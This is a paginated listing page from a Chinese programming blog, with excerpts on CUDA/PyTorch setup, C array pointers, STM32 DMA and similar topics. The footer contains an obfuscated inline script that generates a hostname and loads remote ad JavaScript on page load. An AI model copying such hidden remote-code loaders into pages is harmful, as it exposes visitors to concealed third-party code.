使用CUDA的好处就是透明。根据摩尔定律GPU的晶体管数量不断增多，硬件结构必然是不断的在发展变化，没有必要每次都为不同的硬件结构重新编码，而CUDA就是提供了一种可扩展的编程模型，使得已经写好的CUDA代码可以在任意数量核心的GPU上运行。如下图所示，只有运行时，系统才知道物理处理器的数量。
cudnn NVIDIACUDA®深度神经网络库（cuDNN）是GPU加速的用于深度神经网络的原语库。cuDNN为标准例程提供了高度优化的实现，例如向前和向后卷积，池化，规范化和激活层。
全球的深度学习研究人员和框架开发人员都依赖cuDNN来实现高性能GPU加速。它使他们可以专注于训练神经网络和开发软件应用程序，而不必花时间在底层GPU性能调整上。cuDNN的加快广泛使用的深度学习框架，包括Caffe2，Chainer，Keras，MATLAB，MxNet，PyTorch和TensorFlow。
配置pytorch 获得conda语句
https://pytorch.org/
因为这里只支持到cuda11.3，所以在下面cuda和cudnn的安装都要是11.3版本的。
cuda下载链接 cuda
https://developer.nvidia.com/cuda-toolkit-archive
cudnn下载链接 cudnn
https://developer.nvidia.com/rdp/cudnn-archive
安装教程（移动三个文件夹） 文章
https://blog.csdn.net/sinat_23619409/article/details/84202651
pytorch版本，cuda版本，系统cuda版本查询和对应关系 pytorch版本，cuda版本，系统cuda版本查询和对应关系
https://www.cnblogs.com/Wanggcong/p/12625540.html
测试GPU是否可用 import torch flag = torch.cuda.is_available() print(flag) ngpu= 1 # Decide which device we want to run on device = torch.device("cuda:0" if (torch.cuda.is_available() and ngpu &gt; 0) else "cpu") print(device) print(torch.cuda.get_device_name(0)) print(torch.rand(3,3).cuda()) 输出： True cuda:0 GeForce GTX 1080 tensor([[0.9530, 0.4746, 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a232abeb205500628becde2d768829f3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf026ef7627ec83f5ed65197ac56d27c/" rel="bookmark">
			数组指针与二维数组详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1）如何识别二维数组。 假设数组为a[2][5]
二维数组肯定是有两个维度，从左到右看:
[2]是第一个维度，表示a这个数组里有两个元素。
[5]是第二个维度，需要进入内部观察。第一个维度的每个元素的内部有5个int型的元素。
2）“数组名代表数组首元素的地址”这句话既适用于一维数组，也适用于二维数组。
1、对于一维数组int a[5]而言：数组名a就表示首元素a[0]的地址,及数组名a等价于&amp;a[0];
2、对于二维数b[2][5]组而言：数组名b就表示首元素b[0]的地址，及数组名b等价于&amp;b[0];
3、对于二维数b[2][5]组而言：b[0]是第一维数组的首元素，同时b[0]也是第二维中的数组的数组名。
所以数组名b[0]就表示首元素b[0][0]的地址,及数组名b[0]等价于&amp;b[0][0];
4、对于二维数b[2][5]组而言：b[1]虽然不是第一维数组的首元素，但也是第二维中的数组的数组名。
所以数组名b[1]就表示首元素b[1][0]的地址,及数组名b[1]等价于&amp;b[1][0];
3）访问二维数组的两种方式
1、普通指针指向二维数组的第一维
由于二维数组的，第一维度都是普通的一维数组。如b[2][5]中b[0]和b[1]就都是一维的int型数组。
而b[0]和b[1]都是数组名，分别代表b[0][0]和b[1][0]的地址，所以指针指向二维数组的第一维很容易：
int* p1 = b[0];
int* p2 = b[1];
那么此时，用法和一维数组一样：
printf("b[0][0] = %d.\n", *p1);//*p1对应的是b[0][0]的值
printf("b[0][1] = %d.\n", *(p1+1));//*(p1+1)对应的是b[0][1]的值
printf("b[1][0] = %d.\n", *p2);//*p2对应的是b[1][0]的值 printf("b[1][1] = %d.\n", *(p2+1));//*(p2+1)对应的是b[1][1]的值
2、数组指针访问二维数组
对于二维数b[2][5]组而言：数组名b就表示首元素b[0]的地址，及数组名b等价于&amp;b[0];
而b[0]不仅仅是二维数b[2][5]的首元素，同时也是一个数组的数组名。
所以，&amp;b[0]就相当于对数组名再次区地址。那么我们想想&amp;b[0]是个什么类型？
假设有一个一维数组int a[5]，数组a表示a[0]地址，那么继续对数组名取地址——&amp;a，&amp;a表示什么呢？
我们都知道&amp;a此时数组上和a相同，但意义上不同，&amp;a表示整个数组的地址（而不再是首元素的地址）。
这时数组指针就可以登场了，数组指针就是用来指向整个数组的地址。数组指针的类型为 int (*)[]。
所以&amp;b[0]以及&amp;a都是和这种类型相匹配的，或者说他们就是这种类型。
回到一开始说的，二维数b[2][5]的数组名b等价于&amp;b[0]，而&amp;b[0]是对数组名再次取地址，及&amp;b[0]和int (*)[]类型匹配。
所以有：
int (*p)[5] = b;//这里要注意的是数字5，因为二维数组b[2][5]，第二维是5，所以这里数组指针也是5;数字不同则不匹配。
我们知道，取址和解引用这两个过程是反向过程，&amp;b[0]是对地址（数组名）再次取地址，那么可以想象，要用数组指针p访问到数据，
必须经过两次解引用。
由于数组名b就表示首元素b[0]的地址，而数组名b和数组指针p是同一种类型，所以第一层解引用就是对b[0]的地址解引用，
及是对第一维数组的地址解引用。如&amp;b[0]解引用之后就得到b[0],那么*p就对应b[0],而b[0]仍然是个数组名，再次进行解引用得到b[0][0],
那么*(*p)就对应b[0][0]。最后得出结论：b[i][j]等同于 *(*(p+i)+j)
小结：
1、 a[i][j]等同于 *(*(p+i)+j)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cf026ef7627ec83f5ed65197ac56d27c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e26e770c3032b896f7b5dca8ca72326/" rel="bookmark">
			IDEA配置JDK源码阅读环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先建一个普通的java项目 , 一直下一步
然后找到JDK路径 , 就那个JDK主路径
找到JDK路径后,打开lib下的src.zip,这个就是JDK源码
然后在项目根路径下,建一个文件夹用来存放JDK源码,因为解压出来的根目录名是src,会和项目的src重名
随后将src.zip解压到jdk17目录里
在 添加新的JDK , 先选择原来的 JDK路径
添加后 删除所有的 源路径 信息
在 添加 源路径 ,路径就是 你解压JDK源码的路径
最后修改成 你改好的JDK , 保存,完成
然后你就可以 在文件中 加入 自己的注释 了,但是修改代码是无效的,也没必要修改
idea插件 Translation 读源码是一个很累的事情,如果看不懂官方的注释,那简直是看天书
所以我们需要一个很强大的翻译插件,比如上面 那张图片的 文档注释 就是通过Translation翻译的
SequenceDiagram 时序图 插件,灰常好用
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a2c0fa251e4f9b8e1aec78953b0076e/" rel="bookmark">
			原生H5&#43;JS文件上传
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近，一个项目上使用到一些数据，这些数据必须要从本地导入，因此提供了相关的服务端上传接口，然鹅我是一个纯纯的后端，前端的各种框架都不太会使，并且我认为这样的小项目使用一个前端框架反而不好，比如LayUi，虽然很简单就可以引入，但是有时候我需要做些特殊操作，修改人家源码的底层方法还是不太方便，因一顿google后实现了纯H5+JS实现的方法，连ajax都使用的原生；记录一下：
一、单文件上传 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;上传文件Demo&lt;/title&gt; &lt;/head&gt; &lt;body&gt; qmfy文件管理 &lt;div style="padding: 4px; background-color: #FFECEC;"&gt; &lt;form id="upload" method="POST" enctype="multipart/form-data"&gt; &lt;input type="file" name="file"/&gt; &lt;input type="button" value="提交" onClick="uploadFile();"/&gt; &lt;/form&gt; &lt;/div&gt; &lt;script type="text/javascript" &gt; function uploadFile() { var form = document.getElementById('upload'), formData = new FormData(form); //这里使用ajax的原生方法实现 var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function(){ if(xhr.readyState === 4){ if(xhr.status === 200){ var result = JSON.parse(xhr.responseText); window.alert(result.message); }else{ var result = JSON.parse(xhr.responseText); window.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9a2c0fa251e4f9b8e1aec78953b0076e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3f3916ec82cbc4ce7aa876b9280e6a9/" rel="bookmark">
			HAL库 STM32CubeMX——DMA /中断串口发送与接收
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、DMA
1、DMA简介
2、工程建立
二、HAL库实验中断开关点灯
1、CubeMX工程建立
2、代码撰写
3、硬件连接
三、中断方式串口通信
1、建立工程
2、代码添加
四、总结
五、参考
【STM32】HAL库 STM32CubeMX教程十一---DMA (串口DMA发送接收)_Z小旋-CSDN博客
一、DMA 1、DMA简介 （1）
DMA，全称Direct Memory Access，即直接存储器访问。
DMA传输将数据从一个地址空间复制到另一个地址空间，提供在外设和存储器之间或者存储器和存储器之间的高速数据传输。
（2）DMA定义：
DMA用来提供在外设和存储器之间或者存储器和存储器之间的高速数据传输。无须CPU的干预，通过DMA数据可以快速地移动。这就节省了CPU的资源来做其他操作。
（3）DMA传输方式
DMA的作用就是实现数据的直接传输，而去掉了传统数据传输需要CPU寄存器参与的环节，主要涉及四种情况的数据传输，但本质上是一样的，都是从内存的某一区域传输到内存的另一区域（外设的数据寄存器本质上就是内存的一个存储单元）。四种情况的数据传输如下：
外设到内存
内存到外设
内存到内存
外设到外设
（4）DMA传输参数
我们知道，数据传输，首先需要的是1 数据的源地址 2 数据传输位置的目标地址 ，3 传递数据多少的数据传输量 ，4 进行多少次传输的传输模式 DMA所需要的核心参数，便是这四个
当用户将参数设置好，主要涉及源地址、目标地址、传输数据量这三个，DMA控制器就会启动数据传输，当剩余传输数据量为0时 达到传输终点，结束DMA传输 ，当然，DMA 还有循环传输模式 当到达传输终点时会重新启动DMA传输。
也就是说只要剩余传输数据量不是0，而且DMA是启动状态，那么就会发生数据传输。
（5）DMA传输方式
方法1：DMA_Mode_Normal，正常模式，
当一次DMA数据传输完后，停止DMA传送 ，也就是只传输一次
方法2：DMA_Mode_Circular ，循环传输模式
当传输结束时，硬件自动会将传输数据量寄存器进行重装，进行下一轮的数据传输。 也就是多次传输模式
（6 ）仲裁器
仲裁器的作用是确定各个DMA传输的优先级
仲裁器根据通道请求的优先级来启动外设/存储器的访问。
优先权管理分2个阶段：
软件：每个通道的优先权可以在DMA_CCRx寄存器中设置，有4个等级：
最高优先级
高优先级
中等优先级
低优先级；
硬件：如果2个请求有相同的软件优先级，则较低编号的通道比较高编号的通道有较高的优先权。比如：如果软件优先级相同，通道2优先于通道4。
2、工程建立 （1）设置RCC。设置高速外部时钟HSE 选择外部时钟源
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c3f3916ec82cbc4ce7aa876b9280e6a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c8c157b6f8d818e8609a590563293943/" rel="bookmark">
			VM虚拟机下载及安装教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、下载 官方下载地址
https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.1.0-13591040.exe 二、安装 傻瓜式安装，到了安装路径修改到无中文目录下
安装成功后会有桌面图标
三、密钥 运行程序时需要输入密钥
自行解决
四、运行 分享结束 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b7df1e73e4cedeea97a92ac5cd2fc93/" rel="bookmark">
			jetson.utils的安装必会遇到的问题解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下面这个是在安装过jetson-inference后再python3里面导入import jetson.utils时报的__init__.py的权限不足的问题：
我的解决方案就是把这个原来的__init__.py删掉，自己再创建一个（本来是白色的），它依然不能进行更改编辑保存，还是权限的问题，通过执行命令sudo chmod 777 __init__.py赋予权限之后（该py文件变成了绿色），然后就可以愉快的编辑保存了。。。 __init__.py文件里输入下面的内容，wq!保存并退出即可。。。
下图便是成功导入jetson.utils和jetson.inference后的界面。嘻嘻嘻
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/318/">«</a>
	<span class="pagination__item pagination__item--current">319/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/320/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>